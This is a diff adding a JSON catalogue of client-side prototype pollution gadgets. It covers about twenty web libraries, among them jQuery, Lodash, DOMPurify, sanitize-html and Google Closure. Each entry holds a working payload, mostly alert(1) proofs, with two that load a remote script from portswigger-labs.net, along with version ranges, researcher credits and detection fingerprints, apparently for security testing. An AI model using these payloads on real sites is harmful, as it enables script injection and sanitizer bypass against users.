@@ -1,0 +1,212 @@
+[
+    {
+        "library": "Wistia Embedded Video", 
+        "payload": "<script>\nObject.prototype.innerHTML = '<img/src/onerror=alert(1)>';\n<\/script>",
+        "frameworkCode": "<script src=\"https://fast.wistia.com/embed/medias/j38ihh83m5.jsonp\" async><\/script><script src=\"https://fast.wistia.com/assets/external/E-v1.js\" async><\/script><div class=\"wistia_embed wistia_async_j38ihh83m5\"><\/div>",
+        "frameworkAfter": false,
+        "author": "William Bowling",
+        "twitterHandle": "wcbowling",
+        "version": "All versions",
+        "fingerprint": "return (typeof wistiaEmbeds !== 'undefined')"
+    },
+    {
+        "library": "$(x).off jQuery", 
+        "payload": "<script>\nObject.prototype.preventDefault='x';\nObject.prototype.handleObj='x';\nObject.prototype.delegateTarget='<img/src/onerror=alert(1)>';\n/* No extra code needed for jQuery 1 & 2 */$(document).off('foobar');\n<\/script>",
+        "frameworkCode": "<script/src=https://code.jquery.com/jquery-3.3.1.js><\/script>",
+        "frameworkAfter": false,
+        "author": "Michał Bentkowski",
+        "twitterHandle": "SecurityMB",
+        "version": "All versions",
+        "fingerprint": "return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined')"
+    },
+    {
+        "library": "$(html) jQuery", 
+        "payload": "<script>\nObject.prototype.div=['1','<img src onerror=alert(1)>','1']\n<\/script><script>\n$('<div x=\"x\"></div>')\n<\/script>",
+        "frameworkCode": "<script/src=https://code.jquery.com/jquery-3.3.1.js><\/script>",
+        "frameworkAfter": false,
+        "author": "Sergey Bobrov",
+        "twitterHandle": "Black2Fan",
+        "version": "All versions",
+        "fingerprint": "return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined')"
+    },
+    {
+        "library": "$.get jQuery", 
+        "payload": "<script>\nObject.prototype.url = ['data:,alert(1)//'];\nObject.prototype.dataType = 'script';\n<\/script>\n<script>\n$.get('https://google.com/');\n$.post('https://google.com/');\n<\/script>",
+        "frameworkCode": "<script src=https://code.jquery.com/jquery-3.5.1.js><\/script>",
+        "frameworkAfter": false,
+        "author": "Michał Bentkowski",
+        "twitterHandle": "SecurityMB",
+        "version": ">= 3.0.0",
+        "fingerprint": "return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined')"
+    },
+    {
+        "library": "$.getScript jQuery", 
+        "payload": "<script>\nObject.prototype.src = ['data:,alert(1)//']\n<\/script>\n<script>\n$.getScript('https://google.com/')\n<\/script>",
+        "frameworkCode": "<script src=https://code.jquery.com/jquery-3.5.1.js><\/script>",
+        "frameworkAfter": false,
+        "author": "s1r1us",
+        "twitterHandle": "S1r1u5_",
+        "version": ">= 3.4.0",
+        "fingerprint": "return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined')"
+    },
+    {
+        "library": "$.getScript jQuery", 
+        "payload": "<script>\nObject.prototype.url = 'data:,alert(1)//'\n<\/script>\n<script>\n$.getScript('https://google.com/')\n<\/script>",
+        "frameworkCode": "<script/src=https://code.jquery.com/jquery-3.3.1.js><\/script>",
+        "frameworkAfter": false,
+        "author": "s1r1us",
+        "twitterHandle": "S1r1u5_",
+        "version": "3.0.0 - 3.3.1",
+        "fingerprint": "return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined')"
+    },
+    {
+        "library": "Google reCAPTCHA", 
+        "payload": "<script>\nObject.prototype.srcdoc=['<script>alert(1)<\\/script>']\n<\/script>\n<div class=\"g-recaptcha\" data-sitekey=\"your-site-key\"/>",
+        "frameworkCode": "<script src=\"https://www.google.com/recaptcha/api.js\" async defer><\/script>",
+        "frameworkAfter": false,
+        "author": "s1r1us",
+        "twitterHandle": "S1r1u5_",
+        "version": "",
+        "fingerprint": "return (typeof recaptcha !== 'undefined')"
+    },
+    {
+        "library": "Twitter Universal Website Tag", 
+        "payload": "<script>\nObject.prototype.hif = ['javascript:alert(document.domain)'];\n<\/script>",
+        "frameworkCode": "<script>\n!function(e,t,n,s,u,a){e.twq||(s=e.twq=function(){s.exe?s.exe.apply(s,arguments):s.queue.push(arguments);\n},s.version='1.1',s.queue=[],u=t.createElement(n),u.async=!0,u.src='https://static.ads-twitter.com/uwt.js',a=t.getElementsByTagName(n)[0],a.parentNode.insertBefore(u,a))}(window,document,'script');\n\ntwq('init','twitter_pixel_id');twq('track', 'PageView');\n<\/script>",
+        "frameworkAfter": true,
+        "author": "Sergey Bobrov",
+        "twitterHandle": "Black2Fan",
+        "version": "",
+        "fingerprint": "return (typeof twq !== 'undefined' && typeof twq.version !== 'undefined')"
+    },
+    {
+        "library": "Tealium Universal Tag", 
+        "payload": "<script>\nObject.prototype.attrs = {src:1};\nObject.prototype.src='https://portswigger-labs.net/xss/xss.js'\n<\/script>",
+        "frameworkCode": "<script src=https://tags.tiqcdn.com/utag/tealium-solutions/main/prod/utag.js><\/script>",
+        "frameworkAfter": true,
+        "author": "Sergey Bobrov",
+        "twitterHandle": "Black2Fan",
+        "version": "",
+        "fingerprint": "return (typeof utag !== 'undefined' && typeof utag.id !== 'undefined')"
+    },
+    {
+        "library": "Akamai Boomerang", 
+        "payload": "<script>Object.prototype.BOOMR = 1;\nObject.prototype.url='https://portswigger-labs.net/xss/xss.js'<\/script>",
+        "frameworkCode": "<script src=https://portswigger-labs.net/xss/boomerang.js><\/script>",
+        "frameworkAfter": true,
+        "author": "s1r1us",
+        "twitterHandle": "S1r1u5_",
+        "version": "",
+        "fingerprint": "return (typeof BOOMR !== 'undefined')"
+    },
+    {
+        "library": "Lodash", 
+        "payload": "<script>\nObject.prototype.sourceURL = '\\u2028\\u2029alert(1)'\n<\/script>\n<script>\n_.template('test')\n<\/script>",
+        "frameworkCode": "<script/src=\"https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.15/lodash.min.js\"><\/script>",
+        "frameworkAfter": false,
+        "author": "Alex Brasetvik",
+        "twitterHandle": "alexbrasetvik",
+        "version": "<= 4.17.15",
+        "fingerprint": "return (typeof _ !== 'undefined' && typeof _.template !== 'undefined' && typeof _.VERSION !== 'undefined')"
+    },
+    {
+        "library": "sanitize-html", 
+        "payload": "<script>\nObject.prototype['*'] = ['onload']<\/script>\n<script>\ndocument.write(sanitizeHtml('<iframe onload=alert(1)>'))\n<\/script>",
+        "frameworkCode": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js\"><\/script>",
+        "frameworkAfter": false,
+        "author": "Michał Bentkowski",
+        "twitterHandle": "SecurityMB",
+        "version": "",
+        "fingerprint": "return (typeof sanitizeHtml !== 'undefined')"
+    },
+    {
+        "library": "js-xss", 
+        "payload": "<script>\nObject.prototype.whiteList = {img: ['onerror', 'src']}\n<\/script>\n<script>\ndocument.write(filterXSS('<img src onerror=alert(1)>'))\n<\/script>",
+        "frameworkCode": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/js-xss/0.3.3/xss.min.js\"><\/script>",
+        "frameworkAfter": false,
+        "author": "Michał Bentkowski",
+        "twitterHandle": "SecurityMB",
+        "version": "",
+        "fingerprint": "return (typeof filterXSS !== 'undefined')"
+    },
+    {
+        "library": "DOMPurify", 
+        "payload": "<script>\nObject.prototype.ALLOWED_ATTR = ['onerror', 'src']\n<\/script>\n<script>\ndocument.write(DOMPurify.sanitize('<img src onerror=alert(1)>'))\n<\/script>",
+        "frameworkCode": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.12/purify.min.js\"><\/script>",
+        "frameworkAfter": false,
+        "author": "Michał Bentkowski",
+        "twitterHandle": "SecurityMB",
+        "version": "<= 2.0.12",
+        "fingerprint": "return (typeof DOMPurify !== 'undefined')"
+    },
+    {
+        "library": "DOMPurify", 
+        "payload": "<script>\nObject.prototype.documentMode = 9\n<\/script>",
+        "frameworkCode": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.12/purify.min.js\"><\/script>\n<script>\ndocument.write(DOMPurify.sanitize('<img src onerror=alert(1)>'))\n<\/script>",
+        "frameworkAfter": true,
+        "author": "Michał Bentkowski",
+        "twitterHandle": "SecurityMB",
+        "version": "<= 2.0.12",
+        "fingerprint": "return (typeof DOMPurify !== 'undefined')"
+    },
+    {
+        "library": "Closure", 
+        "payload": "<script>\nconst html = '<img src onerror=alert(1)>';\nconst sanitizer = new goog.html.sanitizer.HtmlSanitizer();\nconst sanitized = sanitizer.sanitize(html);\nconst node = goog.dom.safeHtmlToNode(sanitized);\n\ndocument.body.append(node);\n<\/script>",
+        "frameworkCode": "<script>\nObject.prototype['* ONERROR'] = 1;\nObject.prototype['* SRC'] = 1;\n<\/script>\n<script src=https://google.github.io/closure-library/source/closure/goog/base.js><\/script>\n<script>\ngoog.require('goog.html.sanitizer.HtmlSanitizer');\ngoog.require('goog.dom');\n<\/script>\n",
+        "frameworkAfter": false,
+        "author": "Michał Bentkowski",
+        "twitterHandle": "SecurityMB",
+        "version": "",
+        "fingerprint": "return (typeof goog !== 'undefined' && typeof goog.basePath !== 'undefined')"
+    },
+    {
+        "library": "Closure", 
+        "payload": "<script>\nObject.prototype.CLOSURE_BASE_PATH = 'data:,alert(1)//';\n<\/script>",
+        "frameworkCode": "<script src=https://google.github.io/closure-library/source/closure/goog/base.js><\/script>\n<script>\ngoog.require('goog.html.sanitizer.HtmlSanitizer');\ngoog.require('goog.dom');\n<\/script>",
+        "frameworkAfter": true,
+        "author": "Michał Bentkowski",
+        "twitterHandle": "SecurityMB",
+        "version": "",
+        "fingerprint": "return (typeof goog !== 'undefined' && typeof goog.basePath !== 'undefined')"
+    },
+    {
+        "library": "Marionette.js / Backbone.js", 
+        "payload": "<script>\nObject.prototype.tagName = 'img'\nObject.prototype.src = ['x:x']\nObject.prototype.onerror = ['alert(1)']\n<\/script>\n<script>\n(function() {\nvar View = Mn.View.extend({template: '#template-layout'});\nvar App = Mn.Application.extend({region: '#app', onStart: function() {this.showView(new View());}});\nvar app = new App();\napp.start();\n})();\n<\/script>\n<div id=\"template-layout\" type=\"x-template/underscore\">xxx</div>",
+        "frameworkCode": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js\"><\/script>\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.11.0/underscore-min.js\"><\/script>\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/backbone.js/1.4.0/backbone-min.js\"><\/script>\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/backbone.marionette/4.1.2/backbone.marionette.min.js\"><\/script>",
+        "frameworkAfter": false,
+        "author": "Sergey Bobrov",
+        "twitterHandle": "Black2Fan",
+        "version": "",
+        "fingerprint": "return (typeof Marionette !== 'undefined')\nreturn (typeof Backbone !== 'undefined' && typeof Backbone.VERSION !== 'undefined')"
+    },
+    {
+        "library": "Adobe Dynamic Tag Management", 
+        "payload": "<script>\nObject.prototype.src='data:,alert(1)//'\n<\/script>",
+        "frameworkCode": "<script src=\"https://assets.adobedtm.com/launch-ENa21cfed3f06f4ddf9690de8077b39e81-development.min.js\" async><\/script>",
+        "frameworkAfter": true,
+        "author": "Sergey Bobrov",
+        "twitterHandle": "Black2Fan",
+        "version": "",
+        "fingerprint": "return (typeof _satellite !== 'undefined')"
+    },
+    {
+        "library": "Embedly Cards", 
+        "payload": "<script>\nObject.prototype.onload = 'alert(1)'\n<\/script>",
+        "frameworkCode": "<blockquote class=\"reddit-card\" data-card-created=\"1603396221\">\n<a href=\"https://www.reddit.com/r/Slackers/comments/c5bfmb/xss_challenge/\">XSS Challenge</a>\n</blockquote>\n<script async src=\"https://embed.redditmedia.com/widgets/platform.js\" charset=\"UTF-8\"><\/script>",
+        "frameworkAfter": true,
+        "author": "Guilherme Keerok",
+        "twitterHandle": "k33r0k",
+        "version": "",
+        "fingerprint": "return (typeof window.embedly !== 'undefined')"
+    },
+    {
+        "library": "Segment Analytics.js", 
+        "payload": "<script>\nObject.prototype.script = [1,'<img/src/onerror=alert(1)>','<img/src/onerror=alert(2)>']\n<\/script>",
+        "frameworkCode": "<script type=\"text/javascript\">\n!function(){var analytics=window.analytics=window.analytics||[];if(!analytics.initialize)if(analytics.invoked)window.console&&console.error&&console.error(\"Segment snippet included twice.\");else{analytics.invoked=!0;analytics.methods=[\"trackSubmit\",\"trackClick\",\"trackLink\",\"trackForm\",\"pageview\",\"identify\",\"reset\",\"group\",\"track\",\"ready\",\"alias\",\"debug\",\"page\",\"once\",\"off\",\"on\",\"addSourceMiddleware\",\"addIntegrationMiddleware\",\"setAnonymousId\",\"addDestinationMiddleware\"];analytics.factory=function(t){return function(){var e=Array.prototype.slice.call(arguments);e.unshift(t);analytics.push(e);return analytics}};for(var t=0;t<analytics.methods.length;t++){var e=analytics.methods[t];analytics[e]=analytics.factory(e)}analytics.load=function(t,e){var n=document.createElement(\"script\");n.type=\"text/javascript\";n.async=!0;n.src=\"https://cdn.segment.com/analytics.js/v1/\"+t+\"/analytics.min.js\";var a=document.getElementsByTagName(\"script\")[0];a.parentNode.insertBefore(n,a);analytics._loadOptions=e};analytics.SNIPPET_VERSION=\"4.1.0\";analytics.load(\"platform\");analytics.page();}}();</script>",
+        "frameworkAfter": true,
+        "author": "Sergey Bobrov",
+        "twitterHandle": "Black2Fan",
+        "version": "",
+        "fingerprint": "return (typeof analytics !== 'undefined' && typeof analytics.SNIPPET_VERSION !== 'undefined')"
+    }
+]
